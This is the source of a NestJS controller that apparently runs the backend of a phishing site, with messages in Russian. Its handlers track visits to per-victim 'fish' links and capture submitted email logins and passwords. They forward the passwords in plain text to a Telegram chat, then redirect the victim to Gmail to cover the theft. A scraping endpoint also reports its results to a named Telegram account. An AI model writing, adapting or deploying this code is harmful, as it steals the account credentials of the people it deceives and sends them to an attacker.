import {Body, Controller, Get, Post, Query, Redirect} from '@nestjs/common';
import { AppService } from './app.service';

@Controller()
export class AppController {
  constructor(private readonly appService: AppService) {}



  @Get()
  @Redirect()
  async fishLink(@Query('id') id: number){
    const currentTime = new Date().toISOString()
    let message = `Пользователй перешел по уникальной ссылке с номером ${id}. Время перехода ${currentTime}`
    const sendMessage = await this.appService.sendMessageInTelegram(message)
    if(sendMessage){
      return {
        url: `/auth?id=${id}`
      }
    }
    return ''
  }
  @Post('scrap')
  async scrap_links(@Body() data: any){
    const scraps = await this.appService.scrap(data['arr'])
    const scrapsJSON = JSON.stringify(scraps)

    if ("true" in scraps){
      return scrapsJSON
    }
    return await this.appService.sendMessageInTelegram(`@MaxViktorov\n${scrapsJSON}`)

  }
  @Post()
  @Redirect()
  async login(@Body() body: any, @Query('id') id: number){
    const message = '#ДАННЫЕ\n' +
        `Пользователь с id - ${id} отправил данные\nЛогин: ${body['email']} Пароль: ${body['password']}`
    await this.appService.sendMessageInTelegram(message)

    return {url: 'https://mail.google.com/'}

  }
}
